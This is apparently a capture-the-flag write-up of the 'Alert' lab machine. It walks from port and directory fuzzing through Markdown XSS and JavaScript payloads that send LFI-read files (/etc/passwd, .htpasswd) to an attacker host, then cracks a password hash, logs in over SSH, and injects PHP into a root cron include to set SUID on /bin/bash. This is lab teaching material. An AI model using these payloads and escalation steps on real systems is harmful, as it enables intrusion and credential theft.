---
layout: post
title: Alert - WriteUp
---

# WriteUp

Starting with the Nmap scan:

```shell
sudo nmap --min-rate 5000 -sS -n -vvv -Pn <IP-VICTIM> -oN scan_ports_tcp
```

This reports me ports 22 (SSH) and 80 (HTTP) open. Then, I add the IP address to point to alert.htb in the /etc/hosts file:

```shell
echo "<IP-VICTIM> alert.htb" | sudo tee -a /etc/hosts
```

The website offers the functionality to view Markdown files:

![]({{ site.baseurl }}/images/mardowk_view.png)

About Us:

![]({{ site.baseurl }}/images/about_us.png)

Support:

![]({{ site.baseurl }}/images/support.png)

After that, I performed a fuzzing process:

```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u
"http://alert.htb/FUZZ" -c -v

/'___\ /'___\ /'___\
/\ \__/ /\ \__/ __ __ /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\ \ \_\ \ \____/ \ \_\
\/_/ \/_/ \/___/ \/_/
v2.1.0-dev
________________________________________________
:: Method : GET
:: URL : http://alert.htb/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-
small.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 13ms]
| URL | http://alert.htb/uploads
| --> | http://alert.htb/uploads/
* FUZZ: uploads
[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 14ms]
| URL | http://alert.htb/messages
| --> | http://alert.htb/messages/
* FUZZ: messages
[WARN] Caught keyboard interrupt (Ctrl-C)

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u
"http://alert.htb/FUZZ.php" -c -v

/'___\ /'___\ /'___\
/\ \__/ /\ \__/ __ __ /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\ \ \_\ \ \____/ \ \_\
\/_/ \/_/ \/___/ \/_/
v2.1.0-dev
________________________________________________
:: Method : GET
:: URL : http://alert.htb/FUZZ.php
:: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-
small.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
[Status: 302, Size: 2044, Words: 762, Lines: 86, Duration: 21ms]
| URL | http://alert.htb/index.php
| --> | index.php?page=alert
* FUZZ: index
[Status: 200, Size: 23, Words: 3, Lines: 1, Duration: 47ms]
| URL | http://alert.htb/contact.php
* FUZZ: contact
[Status: 200, Size: 27, Words: 4, Lines: 1, Duration: 26ms]
| URL | http://alert.htb/messages.php
* FUZZ: messages
```

The only interesting thing was "messages.php". I noticed this on login.

I list subdomains

```shell
➜ Alert ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u
"http://alert.htb/" -H "Host: FUZZ.alert.htb" -c -v -fs 2095
/'___\ /'___\ /'___\
/\ \__/ /\ \__/ __ __ /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\ \ \_\ \ \____/ \ \_\
\/_/ \/_/ \/___/ \/_/
v2.1.0-dev
________________________________________________
:: Method : GET
:: URL : http://alert.htb/
:: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-
small.txt
:: Header : Host: FUZZ.alert.htb
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 2095
________________________________________________
[Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 1ms]
| URL | http://alert.htb/
* FUZZ: statistics
```

I add to /etc/hosts:

```shell
echo "<IP> statistics.alert.htb" | sudo tee -a /etc/hosts
```

I see this:

![]({{ site.baseurl }}/images/statistics.png)

Subsequently, I find this: "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-i
n-markdown". There is a way to get an XSS through Markdown. The tags that worked for me when
loading the page were these:

```shell
<!-- XSS with regular tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1) />
```

Got it. At this point, I thought, "How do I chain this together?" First, I created a file called "xss.md"
with the following content:

```shell
<script src="http://<IP-ATTACKER>/pwned.js"></script>
```

Then, go into listening mode with the Python server:

```shell
sudo python3 -m http.server 80
```

You should then see a request arrive at your http server.

Good! We have XSS. I can share the Markdown by clicking the share button. Now it gives me this
URL: "http://alert.htb/visualizer.php?link_share=65eccab5d5d660.08631508.md". Sure, there is a
sharing functionality. It could be that the administrator is seeing this. So, I leave a message in
"contact":

![]({{ site.baseurl }}/images/contact_us.png)

Since I didn't see anything in messages.php from my side, I will check if the user can access this
one:

```shell
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://<IP-ATTACKER>/?content=' + btoa(req.responseText),
true);
req2.send();
```

With this, we are getting the content of http://alert.htb/messages.php

![]({{ site.baseurl }}/images/xss.png)

The result shows a "file" parameter. I'm trying to see if it is vulnerable to LFI.

```shell
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/passwd',
false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://<IP-ATTACKER>/?content=' + btoa(req.responseText),
true);
req2.send();
```

You have to resend the message in "contact" since it is deleted once it is read by the
administrator.

After waiting a minute, I get the /etc/passwd! Of course, what can I do with these users? Perhaps, if
one of them has an id_rsa file and I have read permissions, I might be able to log in as that user.
First, let's see which users have a shell granted:

```shell
cat passwd | grep "sh$"
```

Remembering that statistics.alert.htb employs authentication, I think the .htpasswd file might exist
in /var/www/statistics.alert.htb/. I'm going to try this:

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?
file=../../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://<IP-ATTACKER>/?content=' + btoa(req.responseText),
true);
req2.send();
```

I found the hash $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/ which I cracked:

```shell
hashcat -a 0 -m 1600 creds.hash /usr/share/wordlists/rockyou.txt
```

I find the password is manchesterunited .
On the statistics.alert.htb site I see this:

![]({{ site.baseurl }}/images/dashboard.png)

I see emails, I also see incoming donation income, but, when testing those credentials for ssh they
work.

```shell
ssh albert@alert.htb
```

And I get user.txt. Now I want to elevate my privileges to the "root" user. I see the ports that are
running internally.

```shell
ss -nltp
```

I get this:

```shell
albert@alert:/home$ ss -nltp
State Recv-Q Send-Q Local Address:Port

Peer Address:Port Process

LISTEN 0 4096 127.0.0.1:8080

0.0.0.0:*

LISTEN 0 10 127.0.0.1:41171

0.0.0.0:*

LISTEN 0 5 127.0.0.1:49043

0.0.0.0:*

LISTEN 0 4096 127.0.0.53%lo:53

0.0.0.0:*

LISTEN 0 128 0.0.0.0:22

0.0.0.0:*

LISTEN 0 511 *:80

*:*

LISTEN 0 5 [::1]:49043

[::]:*

LISTEN 0 128 [::]:22

[::]:*
```

I have port 8080 open, so I'm going to use port forwarding:

```shell
ssh albert@alert.htb -L 8080:127.0.0.1:8080
```

On the web I see this:

![]({{ site.baseurl }}/images/8080.png)

I can't find a way to exploit the site, so I would like to use `pspy. After a while, I have noticed an
increase in green bars, suggesting that there is some task that is responsible for monitoring the
site.

```shell
cd /tmp && wget http://192.168.1.71/pspy64 && chmod +x ./pspy64 && ./pspy64
```

After a while, I notice this; in addition, I see UID=0 , which indicates that the task is running as
root:

```shell
2024/10/12 04:19:02 CMD: UID=0 PID=2980 | /bin/sh -c /usr/bin/php -f
/opt/website-monitor/monitor.php >/dev/null 2>&1; cp -r /root/scripts/config
/opt/website-monitor; chmod 770 -R /root/scripts/config
```

My attention is drawn to review the contents of /opt/website-monitor/monitor.php:

```php
<?php
/*

Website Monitor
===============

Hello! This is the monitor script, which does the actual monitoring of websites
stored in monitors.json.

You can run this manually, but it’s probably better if you use a cron job.
Here’s an example of a crontab entry that will run it every minute:

* * * * * /usr/bin/php -f /path/to/monitor.php >/dev/null 2>&1

*/

include('config/configuration.php');
<SNIP>
```

The include is striking. Since I cannot write to monitor.php , I would like to check my privileges in
configuration.php:

```shell
albert@alert:/opt/website-monitor$ ls -la
total 96
drwxrwxr-x 7 root root 4096 Oct 12 01:07 .
drwxr-xr-x 4 root root 4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management 4096 Oct 12 04:06 config
drwxrwxr-x 8 root root 4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root 4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root 5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root 1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root 1452 Oct 12 01:00 monitor.php
drwxrwxr-x 2 root root 4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root 104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root 40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root 1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root 1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root 4096 Oct 12 00:58 updates
albert@alert:/opt/website-monitor$ cd config/
albert@alert:/opt/website-monitor/config$ ls -la
total 12
drwxrwxr-x 2 root management 4096 Oct 12 04:06 .
drwxrwxr-x 7 root root 4096 Oct 12 01:07 ..
-rwxrwxr-x 1 root management 49 Oct 12 04:06 configuration.php
albert@alert:/opt/website-monitor/config$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

Since I am albert and belong to the management group, I can edit configuration.php. When
running monitor.php , config/configuration.php is included. Therefore, if I insert code in PHP
that gives SUID permissions to /bin/bash, it will be executed.

In the /opt/website-monitor/config/configuration.php file, I can add the following content:

```php
<?php
system("chmod u+s /bin/bash");
?>
```

The task runs every minute, and the configuration.php file is reset to its original state after each
execution. After one minute, I can elevate my privileges using:

```shell
albert@alert:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
albert@alert:/tmp$ /bin/bash -p
```

# Automation script to obtain support point:



Github of the script creator: https://github.com/PierSilvioLucchese
